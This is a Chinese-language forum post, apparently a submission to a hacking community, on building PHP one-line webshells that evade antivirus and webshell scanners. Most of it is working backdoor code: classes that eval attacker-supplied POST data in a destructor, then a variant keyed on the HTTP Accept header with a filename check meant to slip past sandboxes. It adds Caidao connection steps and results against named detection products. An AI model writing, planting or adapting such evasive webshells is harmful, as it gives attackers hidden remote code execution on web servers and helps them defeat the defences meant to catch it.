## 0x00  shell编写思路
目前我们一句话shell的编写归根揭底就为命令执行, 只要最后代码命令执行我们外部参数就可称为webshell了，而菜刀的出现也是方便我们使用，我们这时候就用简短的一句话实现我们下一步入侵的功能
,而一般php的命令执行:

>php命令执行函数,分为两种(执行php代码的eval、assert),执行系统命令函数的(system、exec、popen)

言而总之让我们的代码最后可以`eval($_POST['pass'])`就可以了，然而你正常的在代码里写是绝对会被防护软件杀的,我的思路是在类里面写命令执行函数,看安全狗敏不敏感,事实上此思路来自某次审计cms，他们并没有你想的那么智能的拦截

某次看到一个这样的文件
``` php
class test{
    public function __contruct($xx = ""){
		$this->xx = $xx;
}

	public function __destruct(){
		eval(serialize($this->xx))
}
}
```
这样的文件一般会拦截吗,我分别使用了安全狗,webkill，d盾 尝试结果如下:
我写了这样一个文件
``` php
class test{
    public ex($str = ""){
    eval($str);
    }
}
```
![](attachments/contributeupload/180513160566cf0d7fb5a59fc7.png)

## 0x02 实验尝试
只有d盾对其拦截了，当我们把这个类引入构造函数__contruct 和解构函数时__destruct,构造一句话为
``` php
<?php
class OowoO{
    public $mdzz;
    function __construct($str = ""){
        $this->mdzz = $str;
    }

    function __destruct(){
        eval($this->mdzz);
    }
}
if(isset($_POST["pass"])){
    $m= new OowoO($_POST["pass"]);
}
?>
```
菜刀连接尝试
![](attachments/contributeupload/1805131617b4c05c06b90f6919.png)
![](attachments/contributeupload/1805131618806b11ece90ea0f5.png)
当然了这样的基本上d盾和安全狗还有河马的桌面版是不会杀的
我们得出的结论,安全查杀并没有对php类的构造函数和魔术方法进行查杀和检测，我们这样一想可扩展的地方多了(从混淆传入的字符使用回调函数进行代码执行,正则等，加密？？？)

##0x03 扩展引用
这里引用tools的大佬文章的扩展绕过沙盒和人工智能的在线webshell进行查杀的思路,菜刀配置为:
![](![](attachments/contributeupload/1805131656d892c774eed9d49a.png))
shell如下:
``` php
<?php
#error_reporting(5);
#ini_set('session_serialize_handler', 'php');
#session_start();
class OowoO{
    public $mdzz;
    public $func;
    function __construct($str = ""){
        $this->mdzz = $str;
    }

    function __destruct(){
        if(strlen(substr(__FILE__,strripos(__FILE__,"/")+1)-4 <5))
        {
            eval($this->mdzz);
        }
    }
}
if(isset($_POST["$_SERVER[HTTP_ACCEPT]"])){
    $m= new OowoO($_POST["$_SERVER[HTTP_ACCEPT]"], $_POST['func']);
}
?>
```
尝试对大佬说的几个在线进行测试
>BugScaner killwebshell 链接地址 [http://tools.bugscaner.com/killwebshell/](http://tools.bugscaner.com/killwebshell/)
![](attachments/contributeupload/1805131632f01b12f7926714c9.png)

>河马专业版查杀Webshell 链接地址[http://n.shellpub.com/](http://n.shellpub.com/)
![](attachments/contributeupload/1805131641d6d33e6d2512ee2d.png)

>OpenRASP WEBDIR+检测引擎 链接地址 [https://scanner.baidu.com](https://scanner.baidu.com)
![](attachments/contributeupload/18051316452df41af210262443.png)

>PHP webshel​​l检测的深度学习模型 链接地址[http://webshell.cdxy.me/](http://webshell.cdxy.me/)
![](attachments/contributeupload/18051316502d730c901861622c.png)
*我感觉是eval在代码里出现被检测了,其实深度学习的模型应该是像后门的框架库一样去学习检测吧,后来在解构函数代码利用回调函数拼接字符继续bypass 
![](attachments/contributeupload/180513165488eb7a432a6f99b1.png)

## 0x04 总结
传统通过匹配文中特殊函数的检测可以外部传入特殊函数,或者利用字符特性进行编码或部分传入,其实很大一部分都是特征, 针对一句话来讲我们绕过的优势还是很大的,其实难点在于如何连接菜刀时不被拦截,我感觉这才是我们绕过防护最难之处

`引用朋友一句话,你还没有tools账号,你退群吧！！`
希望审核可以给我个机会，能够加入tools大家庭!，以前一直用朋友账号看tools 心塞！



